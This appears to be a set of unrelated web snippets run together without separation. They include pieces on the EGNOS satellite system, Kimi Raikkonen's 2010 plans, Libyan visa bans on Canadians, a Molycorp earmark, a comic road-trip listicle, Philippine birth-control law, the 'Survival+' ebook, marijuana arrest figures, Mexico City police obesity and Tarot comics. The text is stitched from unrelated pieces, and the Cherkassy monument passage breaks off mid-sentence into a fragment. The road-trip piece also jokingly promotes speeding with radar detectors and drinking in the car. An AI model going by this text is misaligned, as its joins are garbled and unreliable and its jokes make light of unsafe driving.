EGNOS is a satellite - based augmentation system that improves the accuracy of satellite navigation signals over Europe .
The system consists of transponders aboard three geostationary satellites over the eastern Atlantic Ocean and Europe , linked to a network of about 40 ground stations and four control centres .
The EGNOS ground stations receive signals sent out by the US GPS satellites .
Information on the accuracy and reliability of these signals is relayed to users via the geostationary satellite transponders .
This allows them to determine their position to within two metres , compared with about 20 metres for GPS alone .
The Open Service is provided free of charge .
EGNOS is the first pan-European navigation satellite system .
It was developed as a joint project by ESA , the European Commission ( EC ) and Eurocontrol , the European Organisation for the Safety of Air Navigation .
ESA had overall responsibility for the design and development of the EGNOS system and placed a contract with a consortium led Thales Alenia Space , France , to develop the system .
After completing development , the EGNOS system was handed over to the EC on 1 April .
EC now owns and manages the EGNOS system .
ESA is the design and procurement agent through a delegation agreement with the EC .
The European Satellite Services Provider , ESSP SaS , founded by seven air navigation services providers and based in Toulouse , France , manages EGNOS operations .
A contract between the EC and ESSP SaS was signed on 30 September .
The contract provides for the management of EGNOS operations and the maintenance of the system until the end of 2013 .

Kimi Raikkonen has revealed that his only real opportunity to remain in Formula 1 next year is to complete a deal with McLaren .
The Finn is a free agent after this season , having agreed an early end to his contract with Ferrari , yet he has not yet firmed up his plans for 2010 .
He has been linked with moves to both McLaren and Toyota next year - but he revealed ahead of Abu Dhabi that there was only one real chance for him if he was going to remain in F1 .
" Toyota has not even been discussed , " Raikkonen told Finnish television station MTV3 .
" If I want to drive [ F1 ] cars , then McLaren in the only option .
I should know the situation in the next few days . "
Raikkonen said in the official FIA press conference in Abu Dhabi that there were other options for him outside of F1 - including rallying or even a sabbatical .
" Basically I have a few different options and we will see what is the best one overall and then make my decision , " he said .
When asked specifically about rallying , Raikkonen said : " It is definitely one of them , but I mean it is not just Formula 1 and rallying .
There are other things I could do and we will see what happens . "
Speaking about the possibility of taking a sabbatical , Raikkonen said : " I can if I want .
I can do whatever I want , but like I said before , I have n't made my decision what I want to do yet . "
Raikkonen 's decision not to pursue an offer from Toyota leaves the Japanese manufacturer facing increasing difficulties to try and find a top - line driver for 2010 - with Robert Kubica also having rejected its overtures to sign a deal with Renault .
The team is understood to have offered both Jarno Trulli and Timo Glock deals for next year , but it is looking likely that both will leave - Trulli potentially for Lotus with Glock closing in on a deal with Renault .
McLaren 's Heikki Kovalainen could be one option for Toyota , with Force India 's Adrian Sutil also being linked in connection with the team .
Japanese Kamui Kobayashi will also put himself firmly in the frame if he impresses again this weekend , following an encouraging debut in Brazil .
OTTAWA–Canadian travellers have been told they 're not welcome in Libya , in an apparent reprisal for Canada 's near tongue - lashing of Moammar Gadhafi .
Gadhafi cancelled a planned stopover in Newfoundland last month after the Harper government made public its intention to scold the Libyan leader over the hero 's welcome Libya gave a man convicted in the Lockerbie bombing .
Since then , Gadhafi has made clear to officials within Libya 's travel visa offices that no visas are to be granted to Canadians wanting to enter the country .
That has left some Canadians who were part of recent tourist groups travelling in the Middle East and North Africa in the lurch .
Canada 's Foreign Affairs department says it is aware of the problems , and that Foreign Affairs Minister Lawrence Cannon raised the issue when he met with Libyan officials last week in Tripoli .
Gadhafi drew international rebuke in August for throwing a huge welcome - home party for Abdel Baset al - Megrahi , who was released from a Scottish prison on compassionate grounds .
The national fete for a convicted terrorist outraged many , especially the relatives of the 270 victims killed in the 1988 bombing of Pan Am Flight 103 .
A spokesman for Prime Minister Stephen Harper said the action " constituted an insult to all the victims who died , including Canadians . "

Here we have the monument to the Motherland erected in Cherkassy city shortly after the World War 2 ended to commemorate the memories of the dead in action heroes .
During Soviet times it was a popular place according to this black and white shot .
People visited it

them , progressive youth called the monument “ The Girl with Sambuca ” .
Such kind of
fires can be met worldwide and in Russia they are called “ Eternal Flames ” .
But nothing is eternal on this Earth as we know .

But then … new technologies came into a play !
They combined a nice pixel flames and a cell phone transmitters inside – that ’s way cool place for
them – high above the city scape .
So now , nobody could suspect Motherland statue to carry burning drink .
Everyone can clearly see that
it ’s a flame , an eternal one .

Rep. Jerry Lewis ( R - Calif . ) inserted the earmark for the mine into the House Defense appropriations bill .

Critics blast $ 3 M mining handout
A mining company owned by Goldman Sachs and two private equity funds is in line to get a $ 3 million earmark for work at a rare earth elements mine in Mountain Pass , Calif .
— raising questions as to why Congress would take on some of the risk for a bailed - out investment giant that ’s already making a profit .
Molycorp Minerals ’s open - pit mine is one of the world ’s richest sources of elements that are used in the production of powerful magnets for precision - guided missiles and smart bombs , handheld communication devices , wind turbines and hybrid cars .
Rep. Jerry Lewis ( R - Calif . ) inserted the earmark for the mine into the House Defense appropriations bill , and backers say it ’s a legitimate national security concern .
The military needs rare earth elements , and China — which is rich in them — has threatened to cut off exports .

But some government watchdogs question whether taxpayers should be asked to prop up a project that is already funded by wealthy investors who expect to make a profit .
“ It ’s probably good business , and we probably do n’t need to subsidize it , ” said Ryan Alexander , president of the nonpartisan Taxpayers for Common Sense .
Moreover , Alexander said , if getting the elements from the mine is really a national security issue , then the funding request would have come through the Department of Defense — and not through a lawmaker ’s earmark .
“ If this is critical to national security , and the private equity firms that own Molycorp can’t find another $ 3 million to meet the needs of the Mountain Pass mine , there still is no excuse for this being an earmark , ” Alexander said .
“ DOD can request programmatic funding so those funds are weighed against other security priorities rather than being singled out by one member of the House Appropriations Committee . ”
Lewis , the top Republican appropriator in the House , insists that both the project and the government backing are necessary .
“ The United States has some of the most extensive deposits of these minerals in the world , but the cost of production has made it difficult to attract private investment , ” said Lewis ’s spokesman , Jim Specht .
“ The $ 3 million from the Department of Defense will jump - start this investment , as well as provide a clear signal that domestic production of rare earth metals is a national security priority . ”
The primary owners of Colorado - based Molycorp are Goldman Sachs and the private equity firms Pegasus Partners and Resource Capital Funds .
Goldman received $ 10 billion in bailout funds last October and has since paid the money back .
But now Molycorp plans to combine $ 3 million in federal money with $ 20 million in private investment to build a “ mine to magnets ” operation that would handle all of the processes from extraction to manufacturing .
Why all the sudden interest in rare earth elements from lawmakers and heavy financial hitters ?
China is the dominant producer of rare earth metals , and its threat to stop exports touched off a scramble to find new sources — or , in this case , an old source that could be refurbished and expanded to ensure the United States is n’t dependent on a rival for vital technologies .
A Molycorp presentation for members of Congress contends that the U.S. must close a “ capability gap ” from mining to magnet production to avoid being dependent on China .
It lays out a timeline between now and 2015 for getting facilities online that would produce metal and magnet powder , culminating in the construction of a magnet production operation .
Andy Davis , who lobbies for Molycorp out of McBee Strategic , said the government ’s help will shorten the timeline for expanding the company ’s operations .
“ What this funding does is help to accelerate this process , ” Davis said .
He also said the company is “ taking enormous steps ” to ensure environmental safety at a mine that spilled hundreds of thousands of gallons of contaminated water in 1996 .
Ultimately , the earmark ’s fate rests in the hands of the Defense appropriators who will meld the House and Senate versions of the bill into a final product later this year .
Defense authorizers in both chambers have approved Defense Science Board studies that would report on supplies of rare earth elements and their relationship to national security .
But Bill Allison , senior fellow at the Sunlight Foundation , says the government should get a share of the action if it ’s going to back a Goldman Sachs venture .
“ It would be nice to see taxpayers getting something out of it other than a bill , ” he said .
A spokesman for Goldman Sachs declined to comment .

I can never pass up a good road trip .
I ca n’t count how many road trips I ’ve been on — it must be approaching triple digits — and I ’m happy to say that the number just keeps increasing .
On Friday , I ’ll be driving to Las Vegas with some friends — a road trip path I ’ve chronicled before in my 11 Highlights of the Los Angeles - Las Vegas Drive , yet one that never gets old .
Over the course of my dozens and dozens of road trips , I ’ve seen it all — the good , the bad , Nebraska .
I ’ve seen what makes a road trip succeed … and I ’ve seen what makes a road trip end with everyone leaving the car and not talking for several hours , days or years .
And now , I ’ve coalesced that life experience into a list of 11 things that will absolutely murder your road trip .
Read .
Learn .
Nebraska .
In no particular order ( so numbered 1 - 11 instead of 11 - 1 , for those that keep up on the day - to - day decisions of why I number lists the way I do ) …
1 | Video games and iPods
Road trips are communal experiences .
Each person in the car is an absolutely crucial element .
To have an ideal road trip , your individual personalities need to combine , like Voltron .
As soon as someone in the backseat goes rogue and starts listening to their own iPod or playing the new , cool Nintendo DS game ( which , I ’m sure , is something like The Pokemons Meet The Jetsons ) … you ’re done .
All of a sudden the communal experience is shattered and , before you know it , the other person in the backseat is asleep and the two people in the front seat are having a two - hour heart - to - heart about how good of friends they are .
2 | Getting a ticket
Getting a speeding ticket during a road trip is brutal for so many reasons .
( 1 ) Instantly destroys the good mood .
( 2 ) Makes you go the speed limit from that point on , therefore kills the fun of bragging about what good time you guys are making .
( 3 ) Leads to the awkward discussion of whether the driver is going to cover the cost of the ticket or if you ’re all going to split it because , odds are , you did n’t do the equivalent of a road trip pre-nup regarding costs .
There are ways around this of course … besides going the speed limit .
You can either go just a lil bit over the speed limit ( like nine miles - per - hour or less ) , so at least the ticket wo n’t hit thousands of dollars / felony level … you can only take road trips through rural Montana where there are no speed limits … or you can invest in some form of ticket prevention technology .
That stuff really can work , too .
One time back in college , my friend Adam and I went on a mini road trip — from school in Chicago up to his family ’s place in Detroit , down to my family ’s place in Cleveland , back to Chicago .
We had one of those radar detectors and were shocked that it did , in fact , work .
We began to praise it as a deity , but that ’s a story for another day .
3 | Billy Joel
It goes without saying that you have to prepare music for the road trip .
And it really does n’t matter what that music is — whatever you guys like , whatever will keep everyone happy , that works .
As long as it ’s not Billy Joel .
Because I can say from empirical evidence that Billy Joel kills road trips .
Just try it once and you ’ll learn the hard way .
As soon as your first few mixes are done and someone suggests you guys switch to Billy Joel , people will start falling asleep , rampantly texting , staring out the window as if drugged .
My friend ( also named ) Sam and I have theorized endlessly as to why Billy Joel is such a road trip killer and , ultimately , we agreed on a principle .
Billy Joel has a decent number of songs that everyone knows ( a good 12 - 15 of these ) … and your average person likes Billy Joel .
( Including me , by the way — this point is not an indictment of Billy Joel . )
But , outside of the dozen - or - so known tracks , his music is pretty droning and depressing .
And some mix of his melodies , his voice and his lyrics that always seem to spin folklore - ish tales have this badly hypnotic quality .
You ca n’t sing along to him , you ca n’t bounce to him … you have to just sit there and listen like you ’re being sung to by a professor reading from his mostly boring memoirs .
With each song it gets worse , until the point where you go to sleep , because his songs and stories have kinda made you want to set yourself on fire .
( And , of course , if you do , Billy Joel has already gone on record to absolve himself of blame . )
4 | Supersizing
I ’m not sure why it happens — there are few things we do in life that expend fewer calories than sitting virtually motionless in a car for hours and hours on end — but people tend to want to eat huge meals during road trip food stops .
You need to fight that instinct .
Going for the super size ( whether it ’s Biggie Sizing or King Sizing or whatever ) will guarantee only two results , both of which are road trip poison : ( 1 ) Indigestion / illness / even vomiting ( 2 ) The need for many momentum - killing bathroom stops .
Just get the smaller fries , the smaller soda , the burritos that do n’t weigh half a pound .
It will benefit you in every single possible way .
5 | Spontaneous arguments over whether or not to pick up drifters
So you ’re on a road trip and you pass a hitchhiker .
This inevitably leads to a debate .
“ What if he ’s a deranged murderer ? ” “ But what if he ’s not ? ” “ I say we pick him up and see what happens . ”
“ I already own a copy of 7 - Minute Abs . ”
I ’m not going to tell you whether or not to pick up that drifter .
But I will say this :
Before you embark , the car should decide on its drifter policy … because you do n’t want to have a huge fight that leads to you turning around to pick him up after all .
6 | Drinking more than three Red Bulls or cups of coffee
Staying awake during a road trip is crucial — otherwise , ya know , you miss the road trip .
But you need to dig down and find some of your energy from within .
When you cross that magic line from well - caffeinated into hallucinating , you ’ve got a problem .
Suddenly the car feels very small .
Suddenly you think everyone in the car is trying to kill you ( especially that drifter you all agreed to pick up a few points back ) .
Suddenly your heart is beating a little too fast and not even the soothing strains of She ’s Always a Woman can slow its pace .
And at that moment , you ’re officially on a bad road trip .
It ’s like a bad acid trip , but with more farting .
7 | Making a schedule that ’s too rigid or too loose
Yes , a road trip is officially about getting from one place to another .
But , really , it ’s just as much about the time in the car .
You want to have a schedule .
You need to have a schedule .
It gives you a goal , a constraint , a mission .
( i.e. , “ We have to get to California for the Nintendo World Video Game Championships by tomorrow or that a - hole with the Power Glove will win ! ” )
But you do n’t want your schedule to be too rigid .
( i.e. , “ If we do n’t get there in an hour Amy Smart will have to call in a bomb threat . ” )
A different friend Adam and I did a California road trip a few years back .
We had places to be , but no hard - and - fast schedule .
This allowed us to stop wherever we wanted .
Detour to UC Santa Cruz ?
Sure !
Stop at every miniature golf course we see off the freeways ?
Sure !
On your road trip , you may spot something off the side of the road — and you should have the freedom and flexibility to do it .
Whether it ’s a water slide park , a blueberry festival ( ? ) , or a farmhouse where the generous and hospitable farmer serves amazing food but only has one rule and that ’s not to touch his blond virginal daughter … stop .
Just give yourself some form of a deadline , to keep your goal - oriented momentum up .
( Plus , once his daughter comes on to you and he chases you out of the house with a double - barrelled shotgun and you and your friends jump in the car and peel out screaming , “ Whoooooa ! ” you ’ll make it on time anyway . )
8 | Traffic leaving your hometown
It ’s a terrible start to a road trip when everyone gets in the car , all excited , you pull on to the freeway … and you ’re instantly met with a wall of traffic and a two - hour delay .
This is almost a guarantee in L.A. ( or when leaving Vegas on a Sunday to return to L.A. ) — but it ’s a possibility anywhere if you leave during a rush hour zone .
So plan your trip around a weird departure time .
Ten in the morning , 11 at night or the ever popular three in the morning — those will all make sure that , within two hours , you ’re no longer getting your hometown radio stations or passing cities whose names you recognize .
9 | Sleeping in the passenger seat
It ’s not ideal , but people fall asleep on road trips .
It happens .
( I ’ve certainly done it — on a road trip my senior year of college I almost managed to sleep from Denver to Lincoln , Nebraska … and then from Lincoln to Chicago the next day .
Do n’t know how that happened . )
But it ’s not OK for the person in the front seat to fall asleep .
They serve as the front seat - back seat conversation liaison , play DJ AND make the arm pumping motion at truck drivers .
And , more importantly , if everyone else falls asleep , they ’re in charge of keeping the driver engaged and awake … so you do n’t ever have to find out if your car has the Navitron Autodrive System like Reliable Red Barclay ’s truck .
10 | Not taking advantage of cool laws in other states
A little research can change everything .
Example : In Arkansas , Connecticut , Delaware , Mississippi , Missouri , Tennessee , Virginia and West Virginia all the passengers are legally allowed to crack open alcoholic beverages .
And in Mississippi , even the driver can join in on the drinking ( as long as his blood alcohol level stays below the legal limit .
( This would be perfect for playing the It ’s Always Sunny state name drinking game .
I recommend North Virginia . )
Whatever does it for you — legal brothels , the counties that ban ATM fees , cities with no sales tax , states where you ’re required to pump your gas , legal marijuana dispensaries , gay marriages , marrying your first cousin — it ’s all out there for you on your road trip , you ’ve just got to do a little research first .
11 | Sharting
Because no matter what else happens on your road trip — you steal a bus from a school for the blind and crash a black fraternity party , you inadvertently wind up driving into a Smash Mouth concert , you destroy the sun sphere from the World ’s Fair in Knoxville — all anyone ’s ever going to remember is the shart .
And your trip does n’t deserve that .

“ When I had my third child , I swore to myself that I will never get pregnant again because I know we could not afford to have another one , ” Ms. Judilla said in a recent interview at her home in Pasig City , on the eastern outskirts of Manila .
Abortion is illegal in the Philippines .
Birth control and related health services have long been available to those who can afford to pay for them through the private medical system , but 70 percent of the population is too poor and depends on heavily subsidized care .
In 1991 , prime responsibility for delivering public health services shifted from the central government to the local authorities , who have broad discretion over which services are dispensed .
Many communities responded by making birth control unavailable .
More recently , however , family planning advocates have been making headway in their campaign to change that .
Legislation before the Philippine Congress , called the Reproductive Health and Population Development Act , would require governments down to the local level to provide free or low - cost reproductive health services , including condoms , birth control pills , tubal ligations and vasectomies .
It would also mandate sex education in all schools , public and private , from fifth grade through high school .
Supporters of the bill cite urgent public health needs .
A 2006 government survey , which interviewed 46,000 women , found that between 2000 and 2006 , only half of Filipino women of reproductive age used birth control of any kind .
According to the Guttmacher Institute , a nonprofit organization based in the United States that researches reproductive health policy , 54 percent of the 3.4 million pregnancies in the Philippines in 2008 were unintended .
Most of those unintended pregnancies  92 percent  resulted from not using birth control , the institute said , and the rest from birth control that failed .
Those unintended pregnancies , the institute says , contributed to an estimated half - million abortions that year , despite a ban on the procedure .
Most of the abortions are done clandestinely and in unsanitary conditions .
Many women resort to crude methods like those Ms. Judilla tried .

Liberty and Liberation : Independence Day and Survival + ( July 4 , 2009 )
I am posting my eBook Survival + on Independence Day for this reason : we need to liberate ourselves from failed models of debt - based bogus " prosperity " and consumerist " happiness " and face the coming national insolvency head - on .
HTML version : Survival+ : Structuring Prosperity for Yourself and the Nation PDF version ( 111 pages ) : Survival +
This eBook is copyrighted but it is available for free distribution and personal - use printing because the subject -- understanding the insolvency and unsustainability of the U.S. economy -- is important , and I do n't want the price of a book to be an issue which inhibits the national discussion we so desperately need to begin .
I do n't expect you to agree with everything in this book -- my goal is simply to add to the national discussion .
Some chapters have been published as entries here , so those will already be familiar to you .
What 's new is the attempt at what I term an integrated understanding .
Given that I spent over 5 weeks this year away on family matters , this 74,000 - word work has required an extraordinary effort , given I have also written some 150,000 words this year on the blog and another 50,000 in emails to readers and correspondents ( rough guesses ) .
So yes , there will be typos and errors which I will be working to resolve as time permits .
This is my attempt at a comprehensive analysis of how we got into the current Depression ; solutions are implicit in the analysis , and I will be working to complete an outline of a " Plan B " sustainable / post - financial collapse economy now that the " Plan A " economy is imploding .
That section will be published ( along with the 74,000 - word analysis posted here ) in Spring 2010 by Feral House Publishing .
That printed book will cost some small sum of money , as the publisher and author need some modest compensation to continue on .
If you find this eBook worthy , I would be honored by your distribution of the work to your friends and colleagues , and by any link you might post to it on the Web .
Thank you , readers , for your kind support and encouragement over the past six months I have devoted to this project .
I could not have done it without your contributions of cash , research and critical thinking .
Here are the first pages of Survival +:
Introduction Since launching my blog www.oftwominds.com in May 2005 , nothing seemed more important than warning readers that the unsustainably leveraged credit - mad global financial system was poised to break down .
Once the system finally crashed in late 2008 , my goal switched to writing a practical guide for not just surviving the coming Great Transformation but prospering : a concept I called Survival + ( Plus ) .
This requires liberating ourselves from failed models of credit expansion , resource depletion , financial looting and a counterfeit prosperity built entirely on debt .
I immediately ran into several great difficulties .
Many others had foreseen the same calamity , and their focus narrowed on individual survival : relocating to a remote / sustainable spot and preparing for societal collapse by stockpiling self - defense and food .
While prudent and practical on a short - term timeline , this response struck me as incomplete on several levels .
Most importantly , stockpiling six months ' supplies would not sustain anyone through a 20 - year Crisis and Transformation ; their own Crisis was simply being delayed a relatively short time .
In other words : " what happens in month seven " ?
Secondly , many " survivalist " proponents focus on individual preparation , as if a single person or household can prosper without a stable , caring community for reciprocal support .
This notion ran counter not just to my own experience but to all of human history .
While I understood the desire to " opt out " and become an Isolationist -- a solution to general turmoil which has roots going back to the dissolution of the Roman Empire and the Warring States era in ancient China -- I felt a more practical , longer - term option to Isolationism should also be presented .
The second great difficulty is that individuals , households and communities exist in larger units : city - states , counties , nations and continents .
Even if nation - states were to break apart , the world would remain tightly interconnected .
Events , weather , shortages and surpluses in distant places would continue to impact us all .
States ( by which I mean all forms of government ) will continue to extend control over resources and wealth .
Trade has been a key component of security and prosperity since the dawn of civilization .
Long before fossil fuels dominated the global economy , land and sea trade in both goods and innovations bound Asia , the Mideast and Europe .
Thus a retreat to isolated islands of self - sufficiency , while understandable and practical on one level , does not align with what history teaches us about prosperity .
Prosperity ultimately depends on stable communities , surplus production and trade .
These essentials have been largely ignored in analyses of the coming Great Transformation .
Thus our individual survival and prosperity are inextricably bound up in larger contexts : we cannot just ignore community , State and trade forces as if they will cease to exist .
Even as they no longer function as they did in the past , it seems wise to influence the larger Transformation rather than view ourselves in an isolation which is ultimately misleading .
That is why I subtitled this book " Structuring Prosperity for Yourself and the Nation . "
To believe that we can prosper individually without regard for the actions of our fellow citizens and the State ( government ) is simply not practical .
Yes , a handful of very rugged people have the experience required to live in the deepest remains of wilderness ; but the wilderness cannot support more than a handful of people , and most of us do not have the requisite skills or ruggedness to survive that splendid isolation .
This , then , is a practical book for the rest of us .
As I organized the book , another great difficulty quickly arose .
I realized that the way a problem is phrased implicitly stakes out the eventual solution .
As a result , the greatest challenge in understanding our plight , both as individuals and communities , is essentially conceptual .
The forces which benefit most from the status quo are pouring all their prodigious resources into framing the " problems " in such a way that the " obvious solutions " leave their own power , influence and wealth intact .
Lest you wonder how this works , recall that all through the initial phase of the financial crisis in 2008 , the mainstream media and standard - issue financial punditry ( SIFP ) blamed the entire crisis on foolish low - income homebuyers who had chosen to finance their purchases with subprime mortgages .
Framed in this way , the " problem " appeared to be caused by credulous citizens in the lower socio-economic levels .
The " solution " was thus to eliminate these people from the pool of potential homebuyers , and auction off their foreclosed homes to worthier buyers .
But subsequent events revealed this framing of the problem to be highly selective : the " problem " extended far beyond feckless subprime borrowers into the top rungs of American Capitalism : the money - center and investment banks , and a politically driven absence of oversight by the very governmental agencies tasked with protecting the public .
The status quo's convenient " framing of the problem " insured that any " solutions " would leave their power , wealth and influence entirely intact ; only the impoverished subprimers would suffer , not those who profited so immensely from the housing / credit bubble .
It was thus clear that a practical analysis of the crisis and coming Transformation requires a deep understanding of how " solutions " are set in the framing of the " problem . "
Indeed , what is " obvious " must be questioned on the deepest levels , for what is " obvious " has two powerful characteristics : it can be managed / manipulated via the mass media , and it directs " solutions " which leave the rentier - financial Power Elite ( what I call the Plutocracy ) intact .
The nature of propaganda in a so - called free State must then be explored in depth as well .
The last great difficulty is also conceptual .
It is relatively straight - forward to present the causes of the coming global crisis : Peak Oil , disintegration of the credit bubble , demographics , etc .
Many books do a fine job of outlining the nature of these interlocking crises .
The books attempting to present solutions typically focus on either individuals ( along the lines of " get rich as the world falls apart " ) or idealized policy " fixes " based on academic understandings of large - scale structures ( articles on G - 20 trade policies , etc ) .
The flaw in both approaches is that neither flows from what I call an integrated understanding of the actual problems .
( Key concepts are italicized when introduced . )
Practical solutions must follow from this integrated understanding .
Without such a comprehensive conceptual framework , then all proposed solutions will be ungrounded and thus dangerously misleading .
Any " solution " which ignores key elements of the problem is doomed to solve nothing .
As in our example of the so - called " subprime crisis , " the " solution " of limiting uncreditworthy borrowers did nothing to address the actual problems : highly profitable and highly fraudulent practices riddling every level of the mortgage / rating / securities industries , perverse incentives that created unprecedented opportunities for windfall exploitation , over - reach and looting , etc .
I cannot claim that reaching such an integrated understanding will be easy .
Many of the concepts presented here may be unfamiliar and thus difficult to grasp at first .
Many are so alien to status quo " explanations " that they may well strike you as the opposite of " obvious . "
But since I have thought about these concepts and forces for years , they seem " obvious " to me .
In the language of our Declaration of Independence : I hold these truths to be self - evident .
So let us begin .
We stand on the threshold of a Great Transformation that will unfold over the next 20 years - - a generation .
The exact turn and sequence of events is unknown , but a clear - eyed appraisal of the forces , trends and cycles already at work will help us , collectively and as individuals , weather the challenges and turn what could be a catastrophe into a positive transformation .
To the status quo understanding of how our world works , this appraisal will be anything but " obvious . "
( Sorting out what is " obvious " is a big part of the analysis which follows . )
A number of other writers have addressed preparing for the Depression which has just begun .
These books are , within their limited scope , practical and useful .
This book aims at a different goal : once we understand the complex forces at work , then we can structure a response on all three levels : household / family , community and nation .
For if there is anything we can confidently predict , it 's that the nation 's crumbling finances will drastically affect every family and every community .
Key concepts in this Introduction : Plutocracy ( rentier - financial Power Elite ) integrated understanding windfall exploitation over - reach
Chapter One : An Overview A great clash between what we are told is unfolding and what is actually unfolding lies just ahead .
The status quo " Powers That Be " and its mainstream media repeatedly insist that :
We have abundant cheap energy for a long time to come ; Peak Oil is decades away .
We have plenty of time for technological wonders to arise and replace petroleum .
The Social Security and Medicare entitlements promised to all Americans , though totalling some $ 50 trillion in excess of projected tax revenues , will be paid ; all that is needed are modest policy adjustments .
The current financial meltdown was unexpected and could not have been foreseen ; it is a temporary " bad patch " which has already been fixed by government intervention and modest policy / regulatory adjustments .
Environmental issues such as the stripping of the world 's fisheries , dead zones in the Chesapeake Bay , dwindling fresh water acquifers , etc. can all be fixed with modest policy adjustments .
The consumerist culture which has evolved over the past 60 years is a natural and highly successful perfection of capitalism , prosperity and American values ; Americans are the happiest , most prosperous people on the planet .
The fast - growing epidemic of obesity and related chronic diseases in the U.S. are puzzling and worrisome , but we have the finest healthcare system in the world .
Yet all of the above is demonstrably false .

I do n’t know if it ’ll be controversial .
Why would it be ?
Unless you ’re deluded enough to think goodness only derives from belief in God , this should be a matter - of - fact statement .
Still , I hope it gets people talking 🙂
We ’ll see what happens .

Washington , DC : Police arrested 847,864 persons for marijuana violations in 2008 , according to the Federal Bureau of Investigation ’s annual Uniform Crime Report , released today .
The total marks a three percent decrease in marijuana arrests from 2007 , when law enforcement arrested a record 872,721 Americans for cannabis - related violations .
Marijuana arrests now comprised one - half ( 49.8 percent ) of all drug arrests reported in the United States .
Of those charged with marijuana violations , approximately 89 percent , 754,224 Americans were charged with possession only .
The remaining 93,640 individuals were charged with “ sale / manufacture , ” a category that includes all cultivation offenses , even those where the marijuana was being grown for personal or medical use .
Marijuana arrests were highest in the Midwest and southern regions of the United States , and lowest in the west .
The 2008 marijuana arrest total is the second highest annual total ever reported .
Commenting on the 2008 figures , NORML Director Allen St. Pierre said : “ Federal statistics released just last week indicate that larger percentages of Americans are using cannabis at the same time that police are arresting a near - record number of Americans for pot-related offenses .
Present enforcement policies are costing American taxpayers tens of billions of dollars , ruining the lives of hundreds of thousands of Americans , and having no impact on marijuana availability or marijuana use in this country .
It is time to end this failed policy and replace prohibition with a policy of marijuana regulation , taxation , and education . ”
NORML Deputy Director Paul Armentano added , “ According to a just - released Rasmussen poll , a majority of American adults believe , correctly , that marijuana is less harmful than booze .
The public has it right ; the law has it wrong . ”

Policías mexicanos , ¡a hacer dieta !
Pie de foto ,
El sobrepeso no es solamente un riesgo de salud personal del policía sino un problema para toda la fuerza .
Afuera de una estación del Metro de ciudad de México , dos policías comen pan relleno con masa de maíz frita en aceite , platillo que en la capital mexicana se conoce como " torta guajolota " .
Uno de ellos , con evidente sobrepeso , asegura que no tiene nada malo consumir ese alimento .
" Nunca me ha hecho daño , además en el servicio comemos lo que se puede " , le dice a BBC Mundo el policía Luis Garay .
Tal vez a él no , pero según estadísticas de la Secretaría de Seguridad Pública ( SSP ) de la capital , el 68 % de los 35.000 policías uniformados padecen sobrepeso , y de éstos cerca de la mitad son considerados obesos .
Es un problema serio no sólo por el riesgo a la salud de los policías sino porque afecta su trabajo , sobre todo para atrapar delincuentes .
" Perseguían a alguien y sufrían un esguince , o no podían respirar ni seguir corriendo " , le dice a BBC Mundo Nora Frías , subsecretaria de Protección Ciudadana de la SSP .
Así , para combatir la obesidad , desde la semana pasada la policía capitalina aplica un programa voluntario de dieta y actividad física entre sus elementos , en el que participan , hasta ahora , sólo 1.325 : el 3,7 % del total .
Infartos
Pie de foto , Las autoridades pretenden inculcar nuevos hábitos : menos calorías y más ejercicio .
Durante mucho tiempo se descuidó la salud de los policías , reconoce Nora Frías .
Así , a diferencia de otras corporaciones del mundo , en la capital mexicana los elementos no están obligados a hacer ejercicio , e incluso algunos tenían 20 años sin someterse a un examen físico , indispensable para conseguir un ascenso .
A esto se suma la dieta de los policías .
En los comedores de la corporación las raciones contenían hasta 4.000 calorías , y durante los rondines en las calles los elementos comen lo que pueden comprar con su sueldo , unos US $ 700 al mes en promedio .
La consecuencia es obesidad y en el caso de 354 policías , la combinación de hipertensión y diabetes .
Son los casos más graves , aunque quienes padecen sobrepeso tienen un riesgo permanente .
" Hay problemas serios en la calle como caídas al caminar , que se les doble un pie o lo más grave , un infarto por no tener ni la condición física ni el cuerpo adecuado para esto " , dice la funcionaria de SSP .
¿ Nuevos hábitos ?
Cero , media , una y dos .
La clave de la dieta que la secretaría de Seguridad aplica a sus policías .
Es decir , cero comida chatarra , media ración de alimentos con grasa o carbohidratos , una hora de ejercicio y dos litros de agua al día .
La SSP también redujo a la mitad las calorías en las raciones que distribuye en sus comedores , de tal manera que en lugar de pastas se ofrecen frutas y vegetales , por ejemplo .
El objetivo es que los policías y sus familias acepten los nuevos hábitos alimenticios , y en seis meses habrá resultados positivos , afirma Nora Frías .
Pero concretar los planes no será fácil , sobre todo porque el ingreso de los elementos limita el acceso a comida saludable , dice el policía Garay .

In order to promote his company , Broadsword Comics , writer / artist Jim Balent occasionally produces video " trailers " for upcoming issues of his supernatural softcore porn comic , Tarot : Witch of the Black Rose .
The latest video hit YouTube last week , so we 've gotten ComicsAlliance contributor and noted Tarotologist Chris Sims to provide a running commentary !
tweetmeme_url = ' http://comicsalliance.com/2009/10/06/tarot-comics-where-softcore-porn-and-haunted-vaginas-collide/'; tweetmeme_source = ' ComicsAlliance ' ;
0:10 - Once you get through the pounding techno beats of the intro and a shot of a topless Tarot fondling a crystal ball -- which probably tells you all you really need to know about the comic -- it 's time to meet Jim Balent himself .
And we 've got to say , no matter what you think about his comics , it 's almost impossible to not like this guy .
Maybe it 's because he has a reputation for being one of the nicest creators in the industry and maybe it 's the way he 's sitting in front of some fake Halloween candles like a friendlier Glenn Danizg , but when you get right down to it , it 's probably because , as Ken Lowery put it on Twitter , he looks like he 's about three seconds away from busting out into huge , Batman - in - Dark - Knight - Returns laughter at how awesome his life is .
And why should n't he ?
His actual job is to write and draw an award - winning -- yes , really -- comic about a witch who does pretty much everything naked and is totally in love with a guy who looks quite a bit like Jim Balent .
He is cold living the dream of every 14 year - old boy .
Even if it 's occasionally a little terrifying for the rest of us .
0:32 - This is Jim 's better half , Holly GoLightly , whose very existence makes us believe in True Love , and we are not even kidding .
Think about it : Jim Balent is a guy who is really into witchcraft and comics about naked girls , and in this crazy world of ours , he managed to find a girl who was also really into witchcraft and comics about naked girls , who married him -- no joke -- in a Star Wars theme wedding where she wore Princess Leia 's metal bikini .
And yes :
He was dressed as Darth Vader , which means he got married while dressed as his bride 's father .
We could n't make up a love story that great if we tried .
0:38 - At this point , promotion starts for the recently released Tarot # 58 , which is billed as the latest installment of a series rooted in female empowerment that actually involves vagina dentata as a minor plot point .
For those of you who are n't familiar with Tarot , that 's pretty much par for the course .
0:54 - No , your ears do not deceive you :
You are hearing the music of BrainClaw !
That 's right : THE BrainClaw .
1:01 - Balent occasionally includes real people in his comics -- there 's a climactic issue where the big bad guy is fought off by the combined efforts of a good chunk of Tarot 's readership , for instance -- and this time around , it 's Tonya Kay , who is described by Balent as " probably the most dangerous actress in Hollywood today . "
